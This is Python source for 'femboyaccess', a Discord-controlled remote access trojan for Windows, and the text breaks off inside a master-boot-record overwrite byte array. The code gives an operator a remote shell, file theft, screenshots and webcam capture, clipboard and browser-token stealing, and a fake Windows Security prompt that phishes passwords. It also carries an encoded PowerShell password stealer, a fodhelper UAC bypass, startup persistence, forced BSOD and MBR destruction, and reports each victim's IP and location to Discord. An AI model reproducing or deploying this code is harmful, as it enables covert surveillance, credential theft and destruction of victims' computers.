import os
import discord
import subprocess
import requests
import json
import pyautogui
import ctypes
import sys
import webbrowser
import random
import asyncio
from playsound import playsound
import winreg
import time
import inspect
import comtypes
import win32com.client as wincl
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from pynput.keyboard import Key, Controller
import re
import datetime
from win32api import *
import pyaudio
import psutil
import winsound
import win32gui
from win32ui import *
from win32con import *
import aiohttp
import patoolib

version = "(version: 1.4)"
login = os.getlogin()
client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(4).hex()
session_name = os.getlogin() + "-" + session_id
guild_id = "1114226494693191742"
commands = "\n".join([
	"help - self-explanatory",
	"ping - self-explanatory",
	"cd - self-explanatory",
	"ls - self-explanatory",
	"download <file> - download a specific file from the victim's computer",
	"cmd - execute a CMD command",
	"run <file> - run a file",
	"screenshot - say cheese!",
	"bsod - self-explanatory",
	"startup - add femboyaccess to startup",
	"furryporn - floods the user's screen with furry porn (e621)",
	"randommousemovements - randomly moves the user's mouse location",
	"randomvolume - changes the volume value randomly",
	"clipboard - fetches the victim's clipboard and sends it",
	"askescalate - asks the user to escalate privileges",
	"escalate - tries to escalate privileges [DETECTED]",
	"whoami - checks if femboyaccess is running as user or admin",
	"msgbox <message> <title> - sends a message box",
	"background <url> - changes the background to a specific image",
	"playsound <url> - plays a sound using its url",
	"doxx - fetches information from ipapi.co like city, zip..",
	"blockinput - blocks inputs",
	"unblockinput - unblocks inputs",
	"tts - text-to-speech message",
	"windowsphish - sends a fake windows security update pop-up asking for a password",
	"displayoff - turns off screen",
	"displayon - turns on screen",
	"critproc - makes femboyaccess into a critical process",
	"uncritproc - makes femboyaccess into a normal process",
	"idletime - shows how much time the user has been idle",
	"passwords - fetches passwords from the user's browsers",
	"streamscreen - STILL not working i swear i'm gonna delete this entire project",
	"pid - gets the current pid",
	"localtime - fetches the user's local time",
	"timeset <year> <month> <day> <hour> <minute> - changes the system's time to a new one",
	"webcampic - takes a pic from the user's webcam",
	"fuckmbr - overwrites the master boot record",
	"regedit <key_path> <value_name> <new_value> - edits a regedit value",
	"taskkill <name> - kills a process",
	"processes - lists all the running processes",
	"disabletaskmgr - disables the task manager",
	"enabletaskmgr - enables the task manager",
	"highbeep <duration> - plays a high beep noise",
	"lowbeep <duration> - plays a low beep noise",
	"custombeep <frequency> <duration> - plays a custom-frequency beep noise",
	"piano - play piano using embed buttons",
	"gdi <mode> <time> - executes GDI effects",
	"opencd - opens the cd tray",
	"closecd - closes the cd tray",
	"spamtext <text> - shows text all over the screen using GDI",
	"sus - downlaods the entire among us game, unzips it and starts it",
	"shutdown - performs a computer shutdown"
	"restart - performs a computer restart",
	"exit - exit this session"
])

random_mouse_running = False
random_volume_control = False
stream_screen = False
spamtext = False

# constants message box types
MB_OK = 0x00000000
MB_OKCANCEL = 0x00000001
MB_YESNO = 0x00000004

# constants message box icons
MB_ICONERROR = 0x00000010
MB_ICONINFORMATION = 0x00000040
MB_ICONWARNING = 0x00000030
MB_ICONQUESTION = 0x00000020

user32 = ctypes.windll.user32

async def startup(file_path=""):
	temp = os.getenv("TEMP")
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
	if file_path == "":
		file_path = sys.argv[0]
	with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
		bat_file.write(r'start "" "%s"' % file_path)

async def start_random_mouse_movements():
	global random_mouse_running
	while random_mouse_running:
		x_offset = random.randint(-10, 10)
		y_offset = random.randint(-10, 10)
		pyautogui.move(x_offset, y_offset, duration=0.02)
		await asyncio.sleep(0.02)

async def start_random_volume_control():
	global random_volume_control
	while random_volume_control:
		volume_change = random.randint(-10, 10)
		pyautogui.press("volumeup" if volume_change > 0 else "volumedown")
		pyautogui.PAUSE = random.uniform(0.5, 2)
		await asyncio.sleep(0.02)

async def start_screen_streaming(message):
	global stream_screen
	while stream_screen:
		screenshot = pyautogui.screenshot()
		path = os.path.join(os.getenv("TEMP"), "screenshot.png")
		screenshot.save(path)
		streaming_screen_file = discord.File(path)
		if 'screenreply' not in locals():
			screenreply = await message.reply(file=streaming_screen_file)
		else:
			await screenreply.remove_attachments(screenreply.attachments)
			await asyncio.sleep(0.5)
			await screenreply.add_files(streaming_screen_file)
		await asyncio.sleep(0.5)

async def check_privileges():
	try:
		if ctypes.windll.shell32.IsUserAnAdmin():
			return "admin"
		else:
			return "user"
	except:
		return "idk"

async def femboyaccess(title, description):
	full_title = "[2;35mfemboyaccess - " + title + f" >w< {version}[0m"
	full_description = "[2;37m" + description + "[0m"
	message = f"```ansi\n{full_title}\n\n{full_description}```"
	return message

async def msgbox(ctx, *, args):
	params = args.split('"')
	message = params[1].strip() if len(params) >= 2 else ""
	title = params[3].strip() if len(params) >= 4 else ""
	await ctx.reply(await femboyaccess("msgbox", f"successfully sent the message box! :3"))
	await asyncio.sleep(0.2)
	ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)  # MB_OK | MB_ICONINFORMATION

def find_token():
	tokens = []
	local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
	paths = {
		"Lightcord": roaming + "\\Lightcord",
		"Opera": roaming + "\\Opera Software\\Opera Stable",
		"Chrome": local + "\\Google\\Chrome\\User Data\\Default",
		"Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
		"MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",
		"Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
		"Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
		"Vivaldi": local + "\\Vivaldi\\User Data\\Default",
		"Chromium": local + "\\Chromium\\User Data\\Default"
	}
	for platform, path in paths.items():
		path += '\\Local Storage\\leveldb'
		try: 
			for file_name in os.listdir(path):
				if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
					continue
				for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
					for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
						for token in re.findall(regex, line): 
							tokens.append(token)
		except FileNotFoundError: continue

	return tokens

def set_system_time(year, month, day, hour, minute):
	win32api.SetSystemTime(year, month, 0, day, hour, minute, 0, 0)

def change_registry_value(key_path, value_name, new_value):
	try:
		command = f'reg add "{key_path}" /v "{value_name}" /t REG_SZ /d "{new_value}" /f'
		subprocess.run(command, shell=True, check=True)
		return 1
	except subprocess.CalledProcessError:
		return -1

def in_venv():
	return sys.prefix != sys.base_prefix

def get_running_processes():
	process_list = []
	for process in psutil.process_iter(['pid', 'name']):
		process_list.append(f"pid: {process.info['pid']}, name: {process.info['name']}")
	return process_list

key_frequencies = {
	'A': 440,
	'B': 493,
	'C': 261,
	'D': 293,
	'E': 329,
	'F': 349,
	'G': 392
}

async def create_piano_embed(message):
	piano_embed = discord.Embed(title=f"femboyaccess - piano >w< {version}", description="click a key to play the according sound! :3")
	for key in key_frequencies:
		piano_embed.add_field(name=key, value='\u200b', inline=True)
	return await message.reply(embed=piano_embed)

class MyView(discord.ui.View):
	def __init__(self, piano_message):
		super().__init__()
		self.piano_message = piano_message

	async def interaction_check(self, interaction):
		if interaction.message.id == self.piano_message.id:
			return True
		return False

	async def on_button_click(self, interaction):
		custom_id = interaction.data['custom_id']
		if custom_id in key_frequencies:
			frequency = key_frequencies[custom_id]
			winsound.Beep(frequency, 500)

	@discord.ui.button(label='A', style=discord.ButtonStyle.primary, custom_id='A')
	async def a_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='B', style=discord.ButtonStyle.primary, custom_id='B')
	async def b_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='C', style=discord.ButtonStyle.primary, custom_id='C')
	async def c_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='D', style=discord.ButtonStyle.primary, custom_id='D')
	async def d_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer()
		await self.on_button_click(interaction)

	@discord.ui.button(label='E', style=discord.ButtonStyle.primary, custom_id='E')
	async def e_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='F', style=discord.ButtonStyle.primary, custom_id='F')
	async def f_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

	@discord.ui.button(label='G', style=discord.ButtonStyle.primary, custom_id='G')
	async def g_button(self, interaction: discord.Interaction, button: discord.ui.Button):
		await interaction.response.defer(ephemeral=True)
		await self.on_button_click(interaction)

async def print_on_screen(ctx, *, args):
	global spamtext
	params = args.split('"')
	text = params[1].strip()
	realx = GetSystemMetrics(0)
	realy = GetSystemMetrics(1)
	while spamtext:
		x = random.randint(0, int(realx))
		y = random.randint(0, int(realy))
		hdc = win32gui.GetDC(0)
		color = RGB(0, 0, 0)
		font = win32gui.GetStockObject(17)
		win32gui.SetTextColor(hdc, color)
		win32gui.SelectObject(hdc, font)
		rect = (x, y, 0, 0)
		win32gui.DrawText(hdc, text, -1, rect, DT_LEFT | DT_NOCLIP)
		win32gui.ReleaseDC(0, hdc)
		await asyncio.sleep(0.001)

async def write_file(response, filename):
	with open(filename, "wb") as f:
		while True:
			chunk = await response.content.read(1024 * 8)
			if not chunk:
				break
			f.write(chunk)

async def download_sus(message):
	url = "https://cdn.discordapp.com/attachments/1121413968158797905/1121415167704580176/Among.Us.v2023.6.13i.rar"
	filename = "sus.rar"
	async with aiohttp.ClientSession() as session:
		async with session.get(url) as response:
			if response.status != 200:
				await message.reply(await femboyaccess("sus", f"error while downloading among us: {response.status} :c"))
				return
			await write_file(response, filename)
	await message.reply(await femboyaccess("sus", "among us downloaded! :3"))
	unzip_directory = os.path.splitext(filename)[0]
	try:
		patoolib.extract_archive(filename, outdir=unzip_directory)
	except patoolib.util.PatoolError as e:
		await message.reply(await femboyaccess("sus", f"error while extracting among us: {str(e)} :c"))
		return
	os.remove(filename)
	await message.reply(await femboyaccess("sus", "among us unzipped! :3"))
	game_directory = os.path.join(unzip_directory, "Among.Us.v2023.6.13i")
	game_executable = os.path.join(game_directory, "Among Us.exe")
	ctypes.windll.shell32.ShellExecuteW(None, "open", game_executable, None, game_directory, 1)
	await message.reply(await femboyaccess("sus", "among us started successfully! :3"))

@client.event
async def on_ready():
	guild = client.get_guild(int(guild_id))
	channel = await guild.create_text_channel(session_name)
	data = requests.get("https://ipapi.co/json/").json()
	country = data['country_name']
	ip = data['ip']

	vmcheck = in_venv()
	if vmcheck == False:
		isvm = "no"
	else:
		isvm = "yes"

	await channel.send(f"""```ansi
[2;35m[0m[2;31mfemboyaccess - new session created! >w<[0m

- [2;34msession[0m: [2;35m{session_id}[0m
- [2;34musername[0m: [2;35m{os.getlogin()}[0m
- [2;34mip[0m: [2;35m{country}, {ip}[0m
- [2;34mis vm: [2;35m{isvm}[0m```""")

@client.event
async def on_message(message):
	global random_mouse_running
	global random_volume_control
	global stream_screen
	global streaming_screen_file
	global spamtext
	if message.author == client.user:
		return

	if message.channel.name != session_name:
		return

	if message.content == "help":
		await message.reply(await femboyaccess("help", commands))

	if message.content == "ping":
		await message.reply(await femboyaccess("ping", f"{round(client.latency * 1000)}ms"))

	if message.content.startswith("cd"):
		directory = message.content.split(" ")[1]
		try:
			os.chdir(directory)
			await message.reply(await femboyaccess("cd", f"changed directory! :3\n\n{os.getcwd()}"))
		except:
			await message.reply(await femboyaccess("cd", f"unknown directory! :c"))

	if message.content == "ls":
		files = "\n".join(os.listdir())
		if files == "":
			files = "no files found!"
		await message.reply(await femboyaccess("ls", files))

	if message.content.startswith("download"):
		file_path = message.content.split(" ")[1]
		try:
			with open(file_path, "rb") as file:
				await message.reply(await femboyaccess("download", "downloaded file! :3"), file=discord.File(file))
		except Exception as e:
			await message.reply(await femboyaccess("download", "failed to download file! :c"))

	if message.content.startswith("shell"):
		command = message.content.split(" ")[1]
		output = subprocess.Popen(
			["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
		).communicate()[0].decode("utf-8")
		if output == "":
			output = "no output! :c"
		await message.reply(f"""```ansi
[2;35mfemboyaccess - shell >w<

[2;37mshell > {os.getcwd()}
[0m[2;35m
[2;37m{output}[0m[2;35m[0m```""")

	if message.content.startswith("run"):
		file = message.content.split(" ")[1]
		subprocess.Popen(file, shell=True)
		await message.reply(f"""```ansi
[2;35mfemboyaccess - run >w<

[2;37mstarted {file}! :3[0m[2;35m[0m```""")

	if message.content.startswith("exit"):
		await message.channel.delete()
		await client.close()
	
	if message.content.startswith("startup"):
		await message.reply("""```ansi
[2;35mfemboyaccess - startup >w<

[2;37mfemboyaccess will now launch at startup! :3[0m[2;35m[0m```""")
		await startup()
		
	if message.content.startswith("bsod"):
		await message.reply("attempting..", delete_after = .1)
		ntdll = ctypes.windll.ntdll
		prev_value = ctypes.c_bool()
		res = ctypes.c_ulong()
		ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
		if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
			await message.reply(await femboyaccess("bsod", "bsod successful! :3"))
		else:
			await message.reply(await femboyaccess("bsod", "bsod failed! :c"))

	if message.content.startswith("screenshot"):
		screenshot = pyautogui.screenshot()
		path = os.path.join(os.getenv("TEMP"), "screenshot.png")
		screenshot.save(path)
		file = discord.File(path)
		await message.reply("""```ansi
[2;35mfemboyaccess - screenshot >w<
[2;37m
screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)

	if message.content.startswith("furryporn"):
		num_searches = int(message.content.split(" ")[1])
		for _ in range(num_searches):
			post = random.randint(10000, 4087966)
			webbrowser.get().open(f"https://e621.net/posts/{post}", new=0)
		await message.reply(f"""```ansi
[2;35mfemboyaccess - furryporn >w<[0m

[2;37mrandom e621 posts opened {num_searches} times![0m```""")

	if message.content.startswith("randommousemovements"):
		if not random_mouse_running:
			random_mouse_running = True
			asyncio.create_task(start_random_mouse_movements())
			await message.reply(await femboyaccess("random mouse movements", "random mouse movements toggled on! :3"))
		else:
			random_mouse_running = False
			await message.reply(await femboyaccess("random mouse movements", "random mouse movements toggled off! :3"))

	if message.content.startswith("randomvolume"):
		if not random_volume_control:
			random_volume_control = True
			asyncio.create_task(start_random_volume_control())
			await message.reply(await femboyaccess("random volume control", "random volume control toggled on! :3"))
		else:
			random_volume_control = False
			await message.reply(await femboyaccess("random volume control", "random volume control toggled off! :3"))

	if message.content.startswith("clipboard"):
		output = os.popen("powershell Get-Clipboard").read()
		if output != "":
			clipboard = f"clipboard fetched successfully! :3\n\n{output}"
		else:
			clipboard = "nothing found in clipboard! :c"
		await message.reply(await femboyaccess("fetch clipboard", clipboard))

	if message.content.startswith("escalate"):
		def isAdmin():
			try:
				is_admin = (os.getuid() == 0)
			except AttributeError:
				is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
			return is_admin
		if isAdmin():
			await message.reply(await femboyaccess("escalate privileges", "you're already admin silly! :3"))
		else:
			class disable_fsr():
				disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
				revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
				def __enter__(self):
					self.old_value = ctypes.c_long()
					self.success = self.disable(ctypes.byref(self.old_value))
				def __exit__(self, type, value, traceback):
					if self.success:
						self.revert(self.old_value)
			await message.reply(await femboyaccess("escalate privileges", "attempting to escalate privileges.."))
			esex = False
			if (sys.argv[0].endswith("exe")):
				esex = True
			if not esex:
				test_str = sys.argv[0]
				current_dir = inspect.getframeinfo(inspect.currentframe()).filename
				cmd2 = current_dir
				create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
				os.system(create_reg_path)
				create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
				os.system(create_trigger_reg_key) 
				create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
				os.system(create_payload_reg_key)
			else:
				test_str = sys.argv[0]
				current_dir = test_str
				cmd2 = current_dir
				create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
				os.system(create_reg_path)
				create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
				os.system(create_trigger_reg_key) 
				create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
				os.system(create_payload_reg_key)
			with disable_fsr():
				os.system("fodhelper.exe")  
			time.sleep(2)
			remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
			os.system(remove_reg)

	if message.content.startswith("whoami"):
		value = await check_privileges()
		await message.reply(await femboyaccess("whoami", f"currently running as: {value} :3"))

	if message.content.startswith("msgbox"):
		await msgbox(message, args=message.content)
		await message.reply(await femboyaccess("msgbox", f"the user saw your message! :3"))

	if message.content.startswith("background"):
		if len(message.content.split(" ")) > 1:
			image_url = message.content.split(" ")[1]
		else:
			image_url = "https://c4.wallpaperflare.com/wallpaper/90/932/24/astolfo-fate-apocrypha-astolfo-fate-grand-order-fate-apocrypha-fate-series-anime-hd-wallpaper-preview.jpg"

		response = requests.get(image_url)
		if response.status_code == 200:
			file_path = os.path.join(os.getenv("TEMP"), "background.jpg")
			with open(file_path, "wb") as f:
				f.write(response.content)
			ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
			await message.reply(await femboyaccess("background", "new background successfully applied! :3"))
		else:
			await message.reply(await femboyaccess("background", "failed to apply new background! :c"))

	if message.content.startswith("playsound"):
		attachment = message.attachments[0] if message.attachments else None
		if attachment:
			file_path = os.path.join(os.getenv("TEMP"), attachment.filename)
			await attachment.save(file_path)
			playsound(file_path.replace("\\", "/"))
			await message.reply(await femboyaccess("playsound", "sound has been played! :3"))
		else:
			await message.reply(await femboyaccess('playsound', 'please attach a sound file as an argument! :3'))

	if message.content.startswith("doxx"):
		data = requests.get("https://ipapi.co/json/").json()
		ip = data["ip"]
		ipver = data["version"]
		region = data["region"]
		city = data["city"]
		country = data["country"]
		postal = data["postal"]
		lat = data["latitude"]
		lon = data["longitude"]
		org = data["org"]
		await message.reply(await femboyaccess('doxx', f'user doxxed! :3\n\nip/version: {ip}/{ipver}\ncountry: {country}\nregion: {region}\ncity: {city}\nzip: {postal}\nlatitude/longitude: {lat}/{lon}\nfai: {org}'))

	if message.content.startswith("blockinput"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin == True:
			donkeyballs = windll.user32.BlockInput(True)
			await message.reply(await femboyaccess("blockinput", "blocked inputs successfully! :3"))
		else:
			await message.reply(await femboyaccess("blockinput", "admin rights are required for this command, silly :3"))

	if message.content.startswith("unblockinput"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin == True:
			donkeyballs = windll.user32.BlockInput(False)
			await message.reply(await femboyaccess("unblockinput", "unblocked inputs successfully! :3"))
		else:
			await message.reply(await femboyaccess("unblockinput", "admin rights are required for this command, silly :3"))

	if message.content.startswith("tts"):
		speak = wincl.Dispatch("SAPI.SpVoice")
		speak.Speak(message.content[4:])
		comtypes.CoUninitialize()
		await message.reply(await femboyaccess("tts", "text transmitted! :3"))

	if message.content.startswith("windowsphish"):
		fem = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
		boy = 'echo $cred.getnetworkcredential().password;'
		full_cmd = 'Powershell "{} {}"'.format(fem,boy)
		instruction = full_cmd

		def shell():   
		   output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		   return output

		result = str(shell().stdout.decode('CP437'))
		await message.reply(await femboyaccess("windowsphish", "text transmitted! :3"))
		await message.reply(await femboyaccess("windowsphish", f"password used: {result}"))

	if message.content.startswith("displayoff"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin == True:
			user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
			await message.reply(await femboyaccess("displayoff", "screen has been turned off! :3"))
		else:
			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly :3"))

	if message.content.startswith("displayon"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin == True:
			user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
			await message.reply(await femboyaccess("displayoff", "screen has been turned off! :3"))
		else:
			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly :3"))

	if message.content.startswith("tokens"):
		found = find_token()
		await message.reply(await femboyaccess("tokens", f"list of tokens found:\n\n{found}"))

	if message.content.startswith("critproc"):
		try:
			ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
			ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
			await message.reply(await femboyaccess("critproc", "femboyaccess is now a critical process! :3"))
		except:
			await message.reply(await femboyaccess("critproc", "could not turn femboyaccess into a critical process! :c"))
	if message.content.startswith("uncritproc"):
		try:
			ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
			await message.reply(await femboyaccess("uncritproc", "femboyaccess is no longer a critical process! :3"))
		except:
			await message.reply(await femboyaccess("uncritproc", "could not turn femboyaccess into a normal process! :c"))

	if message.content.startswith("idletime"):
		class LASTINPUTINFO(ctypes.Structure):
			_fields_ = [
				('cbSize', ctypes.c_uint),
				('dwTime', ctypes.c_int),
			]
		def get_idle_duration():
			lastInputInfo = LASTINPUTINFO()
			lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
			if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
				millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
				return millis / 1000
			else:
				return 0
		duration = get_idle_duration()
		await message.reply(await femboyaccess("idletime", f"user has been idle for {duration} seconds! :3"))

	if message.content.startswith("passwords"):
		temp = os.getenv('temp')
		def shell(command):
			output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			global status
			status = "ok"
			return output.stdout.decode('CP437').strip()
		passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
		f4 = open(temp + r"\passwords.txt", 'w')
		f4.write(str(passwords))
		f4.close()
		file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
		await message.reply(await femboyaccess("passwords", "fetched passwords! :3"), file=file)
		os.remove(temp + r"\passwords.txt")

	if message.content.startswith("streamscreen"):
		if not stream_screen:
			stream_screen = True
			asyncio.create_task(start_screen_streaming(message))
		else:
			stream_screen = False
			await message.reply(await femboyaccess("streamscreen", "no longer streaming the screen! :3"))

	if message.content.startswith("askescalate"):
		await message.reply(await femboyaccess("askescalate", "asking to escalate privileges :3"))
		ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

	if message.content.startswith("pid"):
		pid = os.getpid()
		await message.reply(await femboyaccess("pid", f"current pid is: {pid} :3"))

	if message.content.startswith("localtime"):
		now = datetime.datetime.now()
		current = now.strftime("%H:%M:%S")
		await message.reply(await femboyaccess("localtime", f"user's local time is: {str(current).encode()} :3"))

	if message.content.startswith("timeset"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin == True:
			year = message.content.split(" ")[1]
			month = message.content.split(" ")[2]
			day = message.content.split(" ")[3]
			hour = message.content.split(" ")[4]
			minute = message.content.split(" ")[5]
			set_system_time(int(year), int(month), int(day), int(hour), int(minute))
			await message.reply(await femboyaccess("timeset", "successfully changed the date! :3"))
		else:
			await message.reply(await femboyaccess("timeset", "admin rights are required for this command, silly :3"))

	if message.content.startswith("webcampic"):
		webcam = cv2.VideoCapture(0, CAP_DSHOW)
		result, image = webcam.read()
		imwrite('webcam.png', image)
		reaction_msg = await message.reply(await femboyaccess("webcampic", "did they say cheese? >w<"), file=discord.File('webcam.png'))
		subprocess.run('del webcam.png', shell=True)

	if message.content.startswith("fuckmbr"):
		try:
			hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_ALWAYS, 0, 0)
			buffer = bytes([
				0xE8, 0x07, 0x00, 0xBB, 0x19, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x0F, 
				0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x66, 0x65, 0x6D, 0x62, 0x6F, 0x79, 0x61, 
				0x63, 0x63, 0x65, 0x73, 0x73, 0x20, 0x6F, 0x77, 0x6E, 0x73, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x3A, 
				0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
